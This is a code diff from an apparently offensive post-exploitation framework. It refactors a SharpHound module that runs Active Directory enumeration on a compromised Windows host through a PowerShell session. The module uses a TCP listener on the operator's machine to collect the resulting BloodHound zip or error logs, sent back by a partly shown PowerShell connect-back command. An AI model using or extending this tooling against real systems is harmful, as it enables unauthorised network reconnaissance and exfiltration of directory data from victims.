@@ -4,15 +4,13 @@ import json
 import os
 import re
 import select
-import socket
 import tempfile
-import threading
 import time
 import urllib.request
 import uuid
 import zipfile
 
-from koi.modules.blueprint import KoiModule
+from koi.modules.blueprint import KoiModule, TCPReceiveServer
 from koi.utils.tcp import get_local_ip, spawn_send_server
 
 
@@ -106,51 +104,15 @@ class SharpHoundModule(KoiModule):
         check = self._win_query(f"(Test-Path '{dest}').ToString()")
         return check.strip().lower() == "true"
 
-    def _open_recv_server(self, timeout: float) -> tuple[int, threading.Thread, list[bytes], list[str]]:
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind(("0.0.0.0", 0))
-        srv.listen(1)
-        srv.settimeout(timeout)
-        port = srv.getsockname()[1]
-
-        received: list[bytes] = []
-        error:    list[str]   = []
-
-        def _recv():
-            try:
-                conn, _ = srv.accept()
-                buf = b""
-                while True:
-                    chunk = conn.recv(65536)
-                    if not chunk:
-                        break
-                    buf += chunk
-                received.append(buf)
-                conn.close()
-            except Exception as exc:
-                error.append(str(exc))
-            finally:
-                srv.close()
-
-        t = threading.Thread(target=_recv, daemon=True)
-        t.start()
-        return port, t, received, error
-
     def _run_and_collect(
         self, work_dir: str, exe_name: str,
         log_name: str, collection: str, timeout: float,
     ) -> tuple[str, bytes]:
         """Run SharpHound on target, return (status, payload)."""
         local_ip = get_local_ip(self.session.addr[0])
-        port, t, received, error = self._open_recv_server(timeout)
+        srv  = TCPReceiveServer(timeout=timeout).start()
+        port = srv.port
 
-        # Chain on target:
-        #   1. run SharpHound, capture stdout/stderr into log file
-        #   2. SharpHound writes its zip with a default name (<timestamp>_BloodHound.zip),
-        #      so we glob for *_BloodHound.zip afterwards
-        #   3. Send "OK:" + zip bytes on success, "ERR:" + log on failure,
-        #      "EXC:" + exception text on PowerShell exception
         ps_cmd = (
             f"$ErrorActionPreference='Continue';"
             f"$work='{work_dir}';"
@@ -181,14 +143,7 @@ class SharpHoundModule(KoiModule):
             f"$_s.Flush();$_c.Close()"
         )
         self._send_ps(ps_cmd)
-        t.join(timeout=timeout)
-
-        if error:
-            raise RuntimeError(error[0])
-        if not received:
-            raise TimeoutError("No data received before timeout")
-
-        data = received[0]
+        data = srv.collect()
         if data.startswith(b"OK:"):
             return "ok", data[3:]
         if data.startswith(b"ERR:"):
